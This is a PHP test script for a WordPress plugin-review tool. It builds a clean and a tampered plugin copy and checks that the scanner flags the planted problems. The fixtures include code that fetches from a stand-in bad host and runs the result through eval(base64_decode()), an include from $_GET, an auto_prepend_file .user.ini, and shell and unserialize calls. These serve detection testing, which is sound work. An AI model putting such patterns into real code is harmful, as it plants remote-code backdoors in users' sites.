<?php
/**
 * Engine checks. Builds an installed and an uploaded copy of a small plugin in a temporary
 * folder (the uploaded one with planted problems), runs the review and checks what it finds.
 *
 * Run inside any WordPress with Upload Diff active:
 *     wp eval-file tests/check.php
 *
 * The suspicious code is written at test time, so it never sits in the repository as PHP.
 *
 * @package UploadDiff
 */

// phpcs:ignoreFile -- Test script.

use ClearanceClarence\UploadDiff\CodeScan;
use ClearanceClarence\UploadDiff\Plugin;

$pass = 0;
$fail = 0;
$t    = static function ( $name, $ok, $extra = '' ) use ( &$pass, &$fail ) {
	$ok ? ++$pass : ++$fail;
	echo ( $ok ? 'PASS  ' : 'FAIL  ' ) . $name . ( $ok || '' === $extra ? '' : "\n      " . print_r( $extra, true ) ) . "\n";
};

$root = trailingslashit( get_temp_dir() ) . 'ccs-upload-diff-check-' . wp_generate_password( 6, false );
$put  = static function ( $base, $files ) {
	foreach ( $files as $rel => $body ) {
		wp_mkdir_p( dirname( "$base/$rel" ) );
		file_put_contents( "$base/$rel", $body );
	}
};

$header = static function ( $version, $author, $extra = '' ) {
	return "<?php\n/**\n * Plugin Name: Check Shop\n * Version: $version\n * Author: $author\n * Requires PHP: 7.4\n$extra */\nrequire __DIR__ . '/src/cart.php';\n";
};
$cart_v1 = "<?php\nnamespace CheckShop;\nclass Cart {\n\tpublic function add( \$id ) { do_action( 'check_shop_add', \$id ); }\n\tpublic function remove( \$id ) { do_action( 'check_shop_remove', \$id ); }\n\tprivate function secret() {}\n}\nfunction legacy() {}\n";
$cart_v2 = "<?php\nnamespace CheckShop;\nclass Cart {\n\tpublic function add( \$id ) { do_action( 'check_shop_add', \$id ); }\n\tpublic function clear() { do_action( 'check_shop_cleared' ); }\n\tprivate function other() {}\n}\nadd_action( 'rest_api_init', function () { register_rest_route( 'check/v1', '/cart/(?P<id>\\d+)', array() ); } );\n";

$put(
	"$root/installed/check-shop",
	array(
		'check-shop.php' => $header( '1.0.0', 'Kari' ),
		'src/cart.php'   => $cart_v1,
		'notes.txt'      => "one\ntwo\n",
		'style.css'      => "a { b: c; }\n",
		'readme.txt'     => "=== Check Shop ===\nStable tag: 1.0.0\n\n== Changelog ==\n\n= 1.0.0 =\n* First.\n",
	)
);
$put(
	"$root/upload/check-shop",
	array(
		'check-shop.php'    => $header( '1.1.0', 'Someone Else', " * Update URI: https://updates.example.net/check-shop\n" ),
		'src/cart.php'      => $cart_v2,
		'docs/notes.txt'    => "one\ntwo\n",
		'style.css'         => "a { b: c; }   \r\n",
		'src/sync.php'      => "<?php\n// A comment that says eval( and exec( is fine.\n\$db->exec( 'x' );\n\$x = wp_remote_get( 'https://cdn.example-bad.net/p' );\n" . 'eval( base64_decode( $x ) );' . "\n" . 'include $_GET["f"];' . "\n",
		'images/thumb.php'  => "<?php echo 1;\n",
		'.user.ini'         => "auto_prepend_file=x\n",
		'readme.txt'        => "=== Check Shop ===\nStable tag: 1.1.0\n\n== Changelog ==\n\n= 1.1.0 =\n* New `clear()`.\n\n= 1.0.1 =\n* Fix.\n\n= 1.0.0 =\n* First.\n\n== Upgrade Notice ==\n\n= 1.1.0 =\nRead this.\n",
	)
);

$r = Plugin::build( "$root/upload/check-shop", "$root/installed/check-shop", 'check-shop', array() );
$ids = wp_list_pluck( $r['findings'], 'severity', 'id' );
$by  = array();
foreach ( $r['files'] as $f ) {
	$by[ $f['path'] ] = $f;
}

$t( 'counts', array( 'added' => 3, 'removed' => 0, 'renamed' => 1, 'modified' => 3, 'whitespace' => 1, 'unchanged' => 0 ) == $r['counts'], $r['counts'] );
$t( 'rename detected', 'renamed' === $by['docs/notes.txt']['status'] && 'notes.txt' === $by['docs/notes.txt']['oldPath'] );
$t( 'whitespace-only detected', 'whitespace' === $by['style.css']['status'] );
$t( 'contents attached', isset( $by['src/cart.php']['old'], $by['src/cart.php']['new'] ) );
$t( 'author change', 'warn' === ( $ids['author'] ?? '' ) );
$t( 'update URI change', 'danger' === ( $ids['update-uri'] ?? '' ) );
$t( 'server config file', 'danger' === ( $ids['server-config'] ?? '' ) );
$t( 'PHP in asset folder', 'warn' === ( $ids['php-in-assets'] ?? '' ) );
$t( 'eval with decode', 'danger' === ( $ids['code-eval'] ?? '' ) );
$t( 'include from request', 'danger' === ( $ids['code-include_input'] ?? '' ) );
$t( 'new host', isset( $ids['hosts'] ) );
$t( 'method call named exec is not a shell command', ! isset( $ids['code-shell'] ) );
$t( 'removed API', array( 'CheckShop\\legacy' ) === ( (array) $r['api']['removed'] )['functions'] && array( 'CheckShop\\Cart::remove' ) === ( (array) $r['api']['removed'] )['methods'] );
$t( 'added API', array( 'CheckShop\\Cart::clear' ) === ( (array) $r['api']['added'] )['methods'] && array( '/check/v1/cart/(?P<id>\\d+)' ) === ( (array) $r['api']['added'] )['routes'] );
$t( 'private methods ignored', false === strpos( wp_json_encode( $r['api'] ), 'secret' ) );
$t( 'changelog between versions', array( '1.1.0', '1.0.1' ) === wp_list_pluck( $r['changelog']['entries'], 'version' ), $r['changelog'] );
$t( 'upgrade notice', 'Read this.' === $r['changelog']['notice'] );

// Downgrade: the entries given up come from the installed readme.
$down = Plugin::build( "$root/installed/check-shop", "$root/upload/check-shop", 'check-shop', array() );
$t( 'downgrade finding', isset( wp_list_pluck( $down['findings'], 'severity', 'id' )['downgrade'] ) );
$t( 'downgrade changelog', true === $down['changelog']['downgrade'] && array( '1.1.0', '1.0.1' ) === wp_list_pluck( $down['changelog']['entries'], 'version' ), $down['changelog'] );

// Identical copies.
$same = Plugin::build( "$root/installed/check-shop", "$root/installed/check-shop", 'check-shop', array() );
$t( 'identical copies', array() === $same['files'] && 5 === $same['counts']['unchanged'] );

// Scanner details.
$scan = CodeScan::scan( "<?php\n\$a = `id`;\n\\exec( 'ls' );\nunserialize( \$_COOKIE['x'] );\n", 'x.php' );
$t( 'backticks and namespaced exec', array( 2, 3 ) === $scan['signals']['shell'], $scan['signals'] );
$t( 'unserialize of input', array( 4 ) === $scan['signals']['unserialize_input'] );
$t( 'documentation hosts ignored', array() === CodeScan::hosts( 'see https://developer.wordpress.org/x and https://www.php.net/y' ) );

// Clean up.
require_once ABSPATH . 'wp-admin/includes/class-wp-filesystem-base.php';
require_once ABSPATH . 'wp-admin/includes/class-wp-filesystem-direct.php';
( new WP_Filesystem_Direct( null ) )->rmdir( $root, true );

echo "\n$pass passed, $fail failed\n";
